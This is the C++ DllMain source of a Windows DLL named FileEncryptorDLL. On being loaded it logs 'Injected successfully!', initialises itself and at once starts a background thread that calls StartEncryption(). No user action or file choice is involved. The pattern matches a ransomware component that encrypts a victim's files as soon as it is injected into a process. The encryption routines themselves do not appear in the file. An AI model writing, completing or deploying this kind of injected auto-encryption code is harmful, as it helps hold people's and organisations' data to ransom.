#include "pch.h"
#include "FileEncryptorDLL.h"  // Include your header

// Forward declaration of the thread function
DWORD WINAPI EncryptionThread(LPVOID lpParam) {
    StartEncryption();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // Disable thread notifications for better performance
        DisableThreadLibraryCalls(hModule);

        OutputDebugString(L"FileEncryptorDLL: Injected successfully!\n");

        // Initialize in main thread
        if (!FileEncryptorInitialize()) {
            OutputDebugString(L"FileEncryptorDLL: Initialization failed!\n");
            return FALSE;
        }

        // Create thread for encryption
        HANDLE hThread = CreateThread(
            NULL,
            0,
            EncryptionThread,
            NULL,
            0,
            NULL
        );

        if (hThread) {
            CloseHandle(hThread);  // We don't need the handle
        }
        else {
            OutputDebugString(L"FileEncryptorDLL: Failed to create encryption thread!\n");
        }
        break;
    }
    case DLL_PROCESS_DETACH:
        FileEncryptorCleanup();
        break;
    }
    return TRUE;
}